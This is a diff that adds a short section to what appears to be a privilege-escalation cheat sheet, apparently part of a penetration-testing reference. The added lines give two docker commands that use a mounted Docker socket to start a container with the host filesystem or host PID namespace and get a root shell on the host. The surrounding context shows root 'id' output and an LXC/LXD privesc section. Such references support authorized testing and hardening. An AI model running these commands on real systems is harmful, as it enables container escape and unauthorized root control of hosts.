@@ -574,6 +574,13 @@ sh-5.0# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+More docker privilege escalation using the Docker Socket.
+
+```powershell
+sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
 ### LXC/LXD
 
 The privesc requires to run a container with elevated privileges and mount the host filesystem inside.
